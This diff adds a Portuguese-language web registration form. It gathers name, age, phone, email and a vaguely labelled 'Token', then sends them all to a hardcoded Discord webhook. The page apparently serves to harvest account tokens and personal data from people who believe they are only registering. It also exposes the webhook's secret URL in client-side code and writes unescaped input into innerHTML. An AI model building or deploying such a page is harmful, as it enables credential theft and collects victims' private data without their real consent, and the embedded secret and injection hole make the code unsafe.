@@ -1,0 +1,300 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cadastro</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', system-ui, sans-serif;
+        }
+
+        body {
+            background: #0b0f19;
+            color: #e2e8f0;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .container {
+            background: #111827;
+            width: 100%;
+            max-width: 420px;
+            border-radius: 16px;
+            padding: 40px 32px;
+            border: 1px solid #1f2937;
+            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
+        }
+
+        h1 {
+            font-size: 24px;
+            font-weight: 600;
+            text-align: center;
+            margin-bottom: 6px;
+            color: #f8fafc;
+        }
+
+        .subtitle {
+            text-align: center;
+            color: #94a3b8;
+            font-size: 14px;
+            margin-bottom: 32px;
+        }
+
+        .field {
+            margin-bottom: 20px;
+        }
+
+        label {
+            display: block;
+            font-size: 13px;
+            font-weight: 500;
+            color: #94a3b8;
+            margin-bottom: 6px;
+        }
+
+        input {
+            width: 100%;
+            padding: 12px 14px;
+            background: #0f172a;
+            border: 1px solid #1e293b;
+            border-radius: 8px;
+            color: #f1f5f9;
+            font-size: 15px;
+            transition: all 0.2s;
+        }
+
+        input:focus {
+            outline: none;
+            border-color: #3b82f6;
+            box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.15);
+        }
+
+        input::placeholder {
+            color: #475569;
+        }
+
+        .hint {
+            font-size: 12px;
+            color: #64748b;
+            margin-top: 5px;
+        }
+
+        button {
+            width: 100%;
+            padding: 13px;
+            background: #2563eb;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s;
+            margin-top: 8px;
+        }
+
+        button:hover {
+            background: #1d4ed8;
+        }
+
+        button:active {
+            transform: scale(0.98);
+        }
+
+        button:disabled {
+            background: #1e40af;
+            cursor: not-allowed;
+        }
+
+        #resultado {
+            margin-top: 24px;
+            padding: 14px;
+            border-radius: 8px;
+            font-size: 14px;
+            line-height: 1.5;
+            display: none;
+        }
+
+        .sucesso {
+            background: rgba(16, 185, 129, 0.1);
+            border: 1px solid rgba(16, 185, 129, 0.3);
+            color: #34d399;
+            display: block;
+        }
+
+        .erro {
+            background: rgba(239, 68, 68, 0.1);
+            border: 1px solid rgba(239, 68, 68, 0.3);
+            color: #f87171;
+            display: block;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Cadastro</h1>
+        <p class="subtitle">Preencha os dados abaixo</p>
+
+        <div class="field">
+            <label>Nome</label>
+            <input type="text" id="nome" placeholder="Nome completo" maxlength="60">
+        </div>
+
+        <div class="field">
+            <label>Idade</label>
+            <input type="number" id="idade" placeholder="Ex: 18" min="1" max="99">
+            <div class="hint">Máximo 99 anos</div>
+        </div>
+
+        <div class="field">
+            <label>Telefone</label>
+            <input type="tel" id="telefone" placeholder="(11) 99999-9999" maxlength="15">
+            <div class="hint">Com DDD</div>
+        </div>
+
+        <div class="field">
+            <label>E-mail</label>
+            <input type="email" id="email" placeholder="seu@email.com">
+        </div>
+
+        <div class="field">
+            <label>Token</label>
+            <input type="text" id="token" placeholder="Seu token">
+        </div>
+
+        <button onclick="cadastrar()">Enviar Cadastro</button>
+
+        <div id="resultado"></div>
+    </div>
+
+    <script>
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1531869302242676846/hHFaw-14WZh5r0tOc3u6GjexkFmVKnHCWtTiO-BxrEwUxzyLkNjCK-jBDEsasL_CybyL";
+
+        // Máscara de telefone
+        const telefoneInput = document.getElementById("telefone");
+        telefoneInput.addEventListener("input", function(e) {
+            let value = e.target.value.replace(/\D/g, "");
+            if (value.length > 11) value = value.slice(0, 11);
+
+            if (value.length > 0) {
+                value = value.replace(/^(\d{2})(\d)/g, "($1) $2");
+            }
+            if (value.length > 9) {
+                value = value.replace(/(\d{5})(\d)/, "$1-$2");
+            }
+            e.target.value = value;
+        });
+
+        // Só números na idade
+        document.getElementById("idade").addEventListener("input", function(e) {
+            e.target.value = e.target.value.replace(/\D/g, "");
+        });
+
+        async function cadastrar() {
+            const nome = document.getElementById("nome").value.trim();
+            const idade = document.getElementById("idade").value;
+            const telefone = document.getElementById("telefone").value;
+            const email = document.getElementById("email").value.trim();
+            const token = document.getElementById("token").value.trim();
+            const resultado = document.getElementById("resultado");
+
+            const telefoneLimpo = telefone.replace(/\D/g, "");
+
+            // Validações
+            if (!nome || !idade || !telefone || !email || !token) {
+                mostrarErro("Preencha todos os campos.");
+                return;
+            }
+            if (idade < 1 || idade > 99) {
+                mostrarErro("Idade deve ser entre 1 e 99 anos.");
+                return;
+            }
+            if (telefoneLimpo.length < 10 || telefoneLimpo.length > 11) {
+                mostrarErro("Telefone inválido. Digite DDD + número.");
+                return;
+            }
+
+            // Bloqueia números falsos (11111111, 999999999, 000000000 etc)
+            if (/^(\d)\1+$/.test(telefoneLimpo)) {
+                mostrarErro("Telefone inválido. Não use números repetidos.");
+                return;
+            }
+
+            if (!email.includes("@") || !email.includes(".")) {
+                mostrarErro("E-mail inválido.");
+                return;
+            }
+
+            const botao = document.querySelector("button");
+            botao.disabled = true;
+            botao.textContent = "Enviando...";
+
+            try {
+                const resposta = await fetch(WEBHOOK_URL, {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json"
+                    },
+                    body: JSON.stringify({
+                        embeds: [{
+                            title: "📥 Novo Cadastro",
+                            color: 5793266,
+                            fields: [
+                                { name: "Nome", value: nome, inline: true },
+                                { name: "Idade", value: idade + " anos", inline: true },
+                                { name: "Telefone", value: telefone, inline: true },
+                                { name: "E-mail", value: email, inline: false },
+                                { name: "Token", value: token, inline: true }
+                            ],
+                            footer: {
+                                text: "Formulário de Cadastro"
+                            },
+                            timestamp: new Date().toISOString()
+                        }]
+                    })
+                });
+
+                if (resposta.ok) {
+                    resultado.className = "sucesso";
+                    resultado.innerHTML = `
+                        <strong>Cadastro enviado com sucesso!</strong><br><br>
+                        Nome: ${nome}<br>
+                        Idade: ${idade} anos<br>
+                        Telefone: ${telefone}<br>
+                        E-mail: ${email}<br>
+                        Token: ${token}
+                    `;
+                    resultado.style.display = "block";
+
+                    document.getElementById("nome").value = "";
+                    document.getElementById("idade").value = "";
+                    document.getElementById("telefone").value = "";
+                    document.getElementById("email").value = "";
+                    document.getElementById("token").value = "";
+                } else {
+                    mostrarErro("Erro ao enviar. Verifique o Webhook.");
+                }
+            } catch (erro) {
+                mostrarErro("Erro de conexão. Tente novamente.");
+            }
+
+            botao.disabled = false;
+            botao.textContent = "Enviar Cadastro";
+        }
+
+        function mostrarErro(msg) {
+            const resultado = document.getElementById("resultado");
+            resultado.className = "erro";
+            resultado.textContent = msg;
+            resultado.style.display = "block";
+        }
+    </script>
+</body>
+</html>
